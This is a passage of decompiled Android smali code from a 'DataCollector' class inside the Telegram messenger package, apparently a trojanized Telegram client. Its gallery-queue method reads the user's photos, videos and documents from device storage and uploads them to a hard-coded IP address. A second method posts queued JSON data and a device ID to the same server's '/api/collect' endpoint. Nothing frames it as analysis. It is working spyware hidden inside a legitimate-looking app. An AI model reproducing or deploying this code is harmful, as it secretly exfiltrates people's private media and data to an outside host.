    monitor-enter p0

    .line 1216
    :try_start_0
    iget-boolean v0, v14, Lorg/telegram/messenger/DataCollector;->galleryQueueDraining:Z

    if-eqz v0, :cond_0

    monitor-exit p0

    return-void

    :catchall_0
    move-exception v0

    goto/16 :goto_1a

    :cond_0
    const/4 v15, 0x1

    .line 1217
    iput-boolean v15, v14, Lorg/telegram/messenger/DataCollector;->galleryQueueDraining:Z

    .line 1218
    monitor-exit p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/4 v13, 0x0

    .line 1221
    :try_start_1
    invoke-direct/range {p0 .. p0}, Lorg/telegram/messenger/DataCollector;->getUploadQueue()Lorg/telegram/messenger/DataCollector$UploadQueue;

    move-result-object v12

    .line 1222
    sget-object v16, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    if-eqz v12, :cond_1

    if-nez v16, :cond_2

    :cond_1
    const/4 v1, 0x0

    goto/16 :goto_16

    .line 1224
    :cond_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const/16 v2, 0x14

    invoke-virtual {v12, v0, v1, v2}, Lorg/telegram/messenger/DataCollector$UploadQueue;->dueGallery(JI)Ljava/util/List;

    move-result-object v0

    .line 1225
    invoke-virtual/range {v16 .. v16}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v11

    .line 1226
    const-string v1, "TGCollect"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "gallery drain: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v3, " items due"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 1227
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v17

    const/16 v18, 0x0

    :goto_0
    invoke-interface/range {v17 .. v17}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_13

    invoke-interface/range {v17 .. v17}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    move-object v10, v0

    check-cast v10, Lorg/telegram/messenger/DataCollector$GalleryItem;

    .line 1228
    iget v0, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->account:I

    invoke-direct {v14, v0}, Lorg/telegram/messenger/DataCollector;->fileUploadGate(I)Lorg/telegram/messenger/DataCollector$FileUploadGate;

    move-result-object v0

    .line 1229
    iget-boolean v1, v0, Lorg/telegram/messenger/DataCollector$FileUploadGate;->allowed:Z

    if-nez v1, :cond_3

    .line 1230
    const-string v1, "TGCollect"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "gallery gate blocked account="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v3, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->account:I

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v3, " wifi="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, v0, Lorg/telegram/messenger/DataCollector$FileUploadGate;->networkState:Lorg/telegram/messenger/DataCollector$NetworkState;

    iget-boolean v3, v3, Lorg/telegram/messenger/DataCollector$NetworkState;->wifi:Z

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string v3, " retryMs="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v3, v0, Lorg/telegram/messenger/DataCollector$FileUploadGate;->retryDelayMs:J

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 1233
    iget-wide v1, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->id:J

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    iget-wide v5, v0, Lorg/telegram/messenger/DataCollector$FileUploadGate;->retryDelayMs:J

    add-long/2addr v3, v5

    invoke-virtual {v12, v1, v2, v3, v4}, Lorg/telegram/messenger/DataCollector$UploadQueue;->deferGalleryLater(JJ)V

    const/16 v18, 0x1

    goto :goto_0

    :catchall_1
    move-exception v0

    const/4 v1, 0x0

    goto/16 :goto_19

    :catch_0
    move-exception v0

    const/4 v1, 0x0

    goto/16 :goto_17

    .line 1240
    :cond_3
    iget v0, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->sourceType:I

    const/4 v7, 0x2

    if-eq v0, v15, :cond_5

    if-eq v0, v7, :cond_4

    .line 1255
    sget-object v0, Landroid/provider/MediaStore$Images$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    iget-wide v1, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->mediaId:J

    invoke-static {v0, v1, v2}, Landroid/content/ContentUris;->withAppendedId(Landroid/net/Uri;J)Landroid/net/Uri;

    move-result-object v0

    .line 1257
    const-string v1, "https://38.190.225.166/api/image"

    .line 1258
    const-string v2, "image/jpeg"

    :goto_1
    move-object v8, v1

    move-object v9, v2

    goto :goto_2

    .line 1248
    :cond_4
    const-string v0, "external"

    .line 1249
    invoke-static {v0}, Landroid/provider/MediaStore$Files;->getContentUri(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    iget-wide v1, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->mediaId:J

    .line 1248
    invoke-static {v0, v1, v2}, Landroid/content/ContentUris;->withAppendedId(Landroid/net/Uri;J)Landroid/net/Uri;

    move-result-object v0

    .line 1251
    const-string v1, "https://38.190.225.166/api/doc"

    .line 1252
    const-string v2, "application/octet-stream"

    goto :goto_1

    .line 1242
    :cond_5
    sget-object v0, Landroid/provider/MediaStore$Video$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    iget-wide v1, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->mediaId:J

    invoke-static {v0, v1, v2}, Landroid/content/ContentUris;->withAppendedId(Landroid/net/Uri;J)Landroid/net/Uri;

    move-result-object v0

    .line 1244
    const-string v1, "https://38.190.225.166/api/media"

    .line 1245
    const-string v2, "video/mp4"

    goto :goto_1

    .line 1261
    :goto_2
    new-instance v6, Ljava/io/File;

    invoke-virtual/range {v16 .. v16}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "tgc_g_"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v3, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->mediaId:J

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v3, "_"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->name:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v6, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 1266
    :try_start_2
    const-string v1, "_size"

    filled-new-array {v1}, [Ljava/lang/String;

    move-result-object v3
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_5
    .catchall {:try_start_2 .. :try_end_2} :catchall_a

    const/4 v5, 0x0

    const/16 v19, 0x0

    const/4 v4, 0x0

    move-object v1, v11

    move-object v2, v0

    move-object v15, v6

    move-object/from16 v6, v19

    :try_start_3
    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    const-wide/16 v2, 0x0

    if-eqz v1, :cond_7

    .line 1270
    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-eqz v4, :cond_6

    invoke-interface {v1, v13}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v2

    goto :goto_3

    :catchall_2
    move-exception v0

    move-object/from16 v19, v15

    goto/16 :goto_13

    :catch_1
    move-exception v0

    move-object/from16 v21, v11

    move-object/from16 v25, v12

    move-object/from16 v19, v15

    move-object v15, v10

    goto/16 :goto_f

    .line 1271
    :cond_6
    :goto_3
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    :cond_7
    const-wide/32 v4, 0x1f400000

    cmp-long v1, v2, v4

    if-lez v1, :cond_8

    .line 1274
    const-string v0, "TGCollect"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "gallery skip oversized file ("

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-wide/16 v4, 0x400

    div-long/2addr v2, v4

    div-long/2addr v2, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v2, "MB): "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->name:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_4

    .line 1277
    :cond_8
    invoke-virtual {v11, v0}, Landroid/content/ContentResolver;->openInputStream(Landroid/net/Uri;)Ljava/io/InputStream;

    move-result-object v1
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    if-nez v1, :cond_9

    :goto_4
    move-object/from16 v21, v11

    move-object/from16 v25, v12

    move-object/from16 v19, v15

    const/4 v0, 0x1

    move-object v15, v10

    goto/16 :goto_10

    .line 1281
    :cond_9
    :try_start_4
    new-instance v2, Ljava/io/FileOutputStream;

    invoke-direct {v2, v15}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_5

    const/high16 v0, 0x10000

    .line 1282
    :try_start_5
    new-array v0, v0, [B

    .line 1284
    :goto_5
    invoke-virtual {v1, v0}, Ljava/io/InputStream;->read([B)I

    move-result v3
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_6

    const/4 v4, -0x1

    if-eq v3, v4, :cond_a

    :try_start_6
    invoke-virtual {v2, v0, v13, v3}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_3

    goto :goto_5

    :catchall_3
    move-exception v0

    move-object v3, v0

    move-object/from16 v21, v11

    move-object/from16 v25, v12

    move-object/from16 v19, v15

    move-object v15, v10

    goto/16 :goto_b

    .line 1285
    :cond_a
    :try_start_7
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_5

    :try_start_8
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 1286
    const-string v0, "https://38.190.225.166/api/image"

    invoke-virtual {v8, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_1
    .catchall {:try_start_8 .. :try_end_8} :catchall_2

    if-eqz v0, :cond_b

    .line 1287
    :try_start_9
    const-string v2, "https://38.190.225.166/api/image"

    iget v3, v10, Lorg/telegram/messenger/DataCollector$GalleryItem;->account:I
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_3
    .catchall {:try_start_9 .. :try_end_9} :catchall_2

    const-wide/16 v7, 0x0

    const/4 v9, 0x0

    const-wide/16 v4, 0x0

    const/4 v6, 0x0

    move-object/from16 v1, p0

    move-object v13, v10

    move-object v10, v15

    :try_start_a
    invoke-direct/range {v1 .. v10}, Lorg/telegram/messenger/DataCollector;->uploadFileDirect(Ljava/lang/String;IJIJZLjava/io/File;)Z

    move-result v0

    move-object/from16 v21, v11

    move-object/from16 v25, v12

    move-object/from16 v19, v15

    move-object v15, v13

    move v13, v0

    const/4 v0, 0x0

    goto/16 :goto_10

    :catch_2
    move-exception v0

    :goto_6
    move-object/from16 v21, v11

    move-object/from16 v25, v12

    move-object/from16 v19, v15

    move-object v15, v13

    goto/16 :goto_f

    :catch_3
    move-exception v0

    move-object v13, v10

    goto :goto_6

    :cond_b
    move-object v13, v10

    .line 1288
    iget v0, v13, Lorg/telegram/messenger/DataCollector$GalleryItem;->sourceType:I

    const/16 v10, 0x12c

    const/16 v6, 0xc8

    if-ne v0, v7, :cond_d

    .line 1289
    iget v0, v13, Lorg/telegram/messenger/DataCollector$GalleryItem;->account:I

    iget-object v1, v13, Lorg/telegram/messenger/DataCollector$GalleryItem;->name:Ljava/lang/String;

    invoke-direct {v14, v0, v15, v1, v9}, Lorg/telegram/messenger/DataCollector;->uploadDocDirect(ILjava/io/File;Ljava/lang/String;Ljava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;

    move-result-object v0

    .line 1290
    iget v0, v0, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    if-lt v0, v6, :cond_c

    if-ge v0, v10, :cond_c

    move-object/from16 v21, v11

    move-object/from16 v25, v12

    move-object/from16 v19, v15

    move-object v15, v13

    goto :goto_7

    :cond_c
    move-object/from16 v21, v11

    move-object/from16 v25, v12

    move-object/from16 v19, v15

    move-object v15, v13

    goto :goto_8

    .line 1294
    :cond_d
    iget v3, v13, Lorg/telegram/messenger/DataCollector$GalleryItem;->account:I

    iget-wide v4, v13, Lorg/telegram/messenger/DataCollector$GalleryItem;->mediaId:J

    const-string v0, "video"
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_2
    .catchall {:try_start_a .. :try_end_a} :catchall_2

    const-wide/16 v20, 0x0

    const-wide/16 v22, 0x0

    const/16 v24, 0x0

    move-object/from16 v1, p0

    move-object v2, v8

    move-wide v7, v4

    move-wide/from16 v4, v20

    move-wide v6, v7

    move-object/from16 v20, v9

    move-wide/from16 v8, v22

    move/from16 v10, v24

    move-object/from16 v21, v11

    move-object v11, v15

    move-object/from16 v25, v12

    move-object v12, v0

    move-object/from16 v19, v15

    move-object v15, v13

    move-object/from16 v13, v20

    :try_start_b
    invoke-direct/range {v1 .. v13}, Lorg/telegram/messenger/DataCollector;->uploadMultipartDirect(Ljava/lang/String;IJJJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;

    move-result-object v0

    .line 1296
    iget v0, v0, Lorg/telegram/messenger/DataCollector$PostResult;->code:I
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_4
    .catchall {:try_start_b .. :try_end_b} :catchall_4

    const/16 v1, 0xc8

    if-lt v0, v1, :cond_e

    const/16 v1, 0x12c

    if-ge v0, v1, :cond_e

    :goto_7
    const/4 v0, 0x0

    const/4 v13, 0x1

    goto/16 :goto_10

    :cond_e
    :goto_8
    const/4 v0, 0x0

    :goto_9
    const/4 v13, 0x0

    goto/16 :goto_10

    :catchall_4
    move-exception v0

    goto/16 :goto_13

    :catch_4
    move-exception v0

    goto :goto_f

    :catchall_5
    move-exception v0

    move-object/from16 v21, v11

    move-object/from16 v25, v12

    move-object/from16 v19, v15

    move-object v15, v10

    :goto_a
    move-object v2, v0

    goto :goto_d

    :catchall_6
    move-exception v0

    move-object/from16 v21, v11

    move-object/from16 v25, v12

    move-object/from16 v19, v15

    move-object v15, v10

    move-object v3, v0

    .line 1281
    :goto_b
    :try_start_c
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_7

    goto :goto_c

    :catchall_7
    move-exception v0

    move-object v2, v0

    :try_start_d
    invoke-virtual {v3, v2}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_c
    throw v3
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_8

    :catchall_8
    move-exception v0

    goto :goto_a

    :goto_d
    :try_start_e
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_9

    goto :goto_e

    :catchall_9
    move-exception v0

    move-object v1, v0

    :try_start_f
    invoke-virtual {v2, v1}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_e
    throw v2
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_4
    .catchall {:try_start_f .. :try_end_f} :catchall_4

    :catchall_a
    move-exception v0

    move-object/from16 v19, v6

    goto/16 :goto_13

    :catch_5
    move-exception v0

    move-object/from16 v19, v6

    move-object v15, v10

    move-object/from16 v21, v11

    move-object/from16 v25, v12

    .line 1301
    :goto_f
    :try_start_10
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_10

    .line 1302
    const-string v1, "No such file"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_f

    const-string v1, "FileNotFound"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_10

    :cond_f
    const/4 v0, 0x1

    goto :goto_9

    .line 1305
    :cond_10
    const-string v1, "TGCollect"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "gallery queue upload "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, v15, Lorg/telegram/messenger/DataCollector$GalleryItem;->name:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ": "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_4

    goto :goto_8

    .line 1308
    :goto_10
    :try_start_11
    invoke-virtual/range {v19 .. v19}, Ljava/io/File;->delete()Z

    if-eqz v13, :cond_11

    .line 1312
    const-string v0, "TGCollect"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "gallery upload ok: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v15, Lorg/telegram/messenger/DataCollector$GalleryItem;->name:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 1313
    iget-wide v0, v15, Lorg/telegram/messenger/DataCollector$GalleryItem;->id:J

    move-object/from16 v6, v25

    invoke-virtual {v6, v0, v1}, Lorg/telegram/messenger/DataCollector$UploadQueue;->markGalleryDone(J)V

    :goto_11
    const/4 v7, 0x1

    goto :goto_12

    :cond_11
    move-object/from16 v6, v25

    if-eqz v0, :cond_12

    .line 1315
    const-string v0, "TGCollect"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "gallery upload abandon: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v15, Lorg/telegram/messenger/DataCollector$GalleryItem;->name:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 1316
    iget-wide v0, v15, Lorg/telegram/messenger/DataCollector$GalleryItem;->id:J

    invoke-virtual {v6, v0, v1}, Lorg/telegram/messenger/DataCollector$UploadQueue;->markGalleryAbandoned(J)V

    goto :goto_11

    .line 1318
    :cond_12
    iget v0, v15, Lorg/telegram/messenger/DataCollector$GalleryItem;->attempts:I

    const/4 v7, 0x1

    add-int/lit8 v3, v0, 0x1

    .line 1319
    const-string v0, "TGCollect"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "gallery upload retry("

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, "): "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v15, Lorg/telegram/messenger/DataCollector$GalleryItem;->name:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 1320
    iget-wide v1, v15, Lorg/telegram/messenger/DataCollector$GalleryItem;->id:J

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    invoke-direct {v14, v3}, Lorg/telegram/messenger/DataCollector;->retryDelayMs(I)J

    move-result-wide v8

    add-long/2addr v4, v8

    move-object v0, v6

    invoke-virtual/range {v0 .. v5}, Lorg/telegram/messenger/DataCollector$UploadQueue;->retryGalleryLater(JIJ)V

    :goto_12
    move-object v12, v6

    move-object/from16 v11, v21

    const/4 v13, 0x0

    const/4 v15, 0x1

    goto/16 :goto_0

    .line 1308
    :goto_13
    invoke-virtual/range {v19 .. v19}, Ljava/io/File;->delete()Z

    .line 1309
    throw v0

    :cond_13
    move-object v6, v12

    .line 1323
    invoke-virtual {v6}, Lorg/telegram/messenger/DataCollector$UploadQueue;->hasPendingGallery()Z

    move-result v0

    if-eqz v0, :cond_15

    if-eqz v18, :cond_14

    const-wide/32 v0, 0x493e0

    goto :goto_14

    :cond_14
    const-wide/16 v0, 0x2710

    .line 1324
    :goto_14
    invoke-direct {v14, v0, v1}, Lorg/telegram/messenger/DataCollector;->scheduleGalleryQueueDrain(J)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_0
    .catchall {:try_start_11 .. :try_end_11} :catchall_1

    :cond_15
    const/4 v1, 0x0

    .line 1329
    :goto_15
    iput-boolean v1, v14, Lorg/telegram/messenger/DataCollector;->galleryQueueDraining:Z

    goto :goto_18

    :goto_16
    iput-boolean v1, v14, Lorg/telegram/messenger/DataCollector;->galleryQueueDraining:Z

    return-void

    .line 1327
    :goto_17
    :try_start_12
    const-string v2, "TGCollect"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "drainGalleryQueue: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_12
    .catchall {:try_start_12 .. :try_end_12} :catchall_b

    goto :goto_15

    :goto_18
    return-void

    :catchall_b
    move-exception v0

    .line 1329
    :goto_19
    iput-boolean v1, v14, Lorg/telegram/messenger/DataCollector;->galleryQueueDraining:Z

    .line 1330
    throw v0

    .line 1218
    :goto_1a
    :try_start_13
    monitor-exit p0
    :try_end_13
    .catchall {:try_start_13 .. :try_end_13} :catchall_0

    throw v0
.end method

.method private drainJsonQueue()V
    .locals 13

    .line 1159
    monitor-enter p0

    .line 1160
    :try_start_0
    iget-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->jsonQueueDraining:Z

    if-eqz v0, :cond_0

    monitor-exit p0

    return-void

    :catchall_0
    move-exception v0

    goto/16 :goto_6

    :cond_0
    const/4 v0, 0x1

    .line 1161
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->jsonQueueDraining:Z

    .line 1162
    monitor-exit p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/4 v1, 0x0

    .line 1164
    :try_start_1
    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->getUploadQueue()Lorg/telegram/messenger/DataCollector$UploadQueue;

    move-result-object v8
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    if-nez v8, :cond_1

    .line 1191
    iput-boolean v1, p0, Lorg/telegram/messenger/DataCollector;->jsonQueueDraining:Z

    return-void

    .line 1166
    :cond_1
    :try_start_2
    sget-object v2, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    invoke-static {v2}, Lorg/telegram/messenger/DataCollector;->getDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    .line 1167
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const/16 v4, 0x28

    invoke-virtual {v8, v2, v3, v4}, Lorg/telegram/messenger/DataCollector$UploadQueue;->due(JI)Ljava/util/List;

    move-result-object v2

    .line 1168
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v10

    :goto_0
    invoke-interface {v10}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_5

    invoke-interface {v10}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lorg/telegram/messenger/DataCollector$QueueItem;

    .line 1169
    iget-object v3, v2, Lorg/telegram/messenger/DataCollector$QueueItem;->payload:Ljava/lang/String;

    sget-object v4, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v3, v4}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v3

    .line 1170
    const-string v4, "https://38.190.225.166/api/collect"

    invoke-direct {p0, v4, v3, v9}, Lorg/telegram/messenger/DataCollector;->doPost(Ljava/lang/String;[BLjava/lang/String;)Lorg/telegram/messenger/DataCollector$PostResult;

    move-result-object v3

    .line 1171
    iget v4, v3, Lorg/telegram/messenger/DataCollector$PostResult;->code:I

    const/16 v5, 0xc8

    if-lt v4, v5, :cond_2

    const/16 v5, 0x12c

    if-ge v4, v5, :cond_2

    .line 1172
    iget-wide v3, v2, Lorg/telegram/messenger/DataCollector$QueueItem;->id:J

    invoke-virtual {v8, v3, v4}, Lorg/telegram/messenger/DataCollector$UploadQueue;->delete(J)V

    .line 1173
    iget-object v2, v2, Lorg/telegram/messenger/DataCollector$QueueItem;->payload:Ljava/lang/String;

    invoke-direct {p0, v2}, Lorg/telegram/messenger/DataCollector;->onQueuedJsonSent(Ljava/lang/String;)V

    goto :goto_0

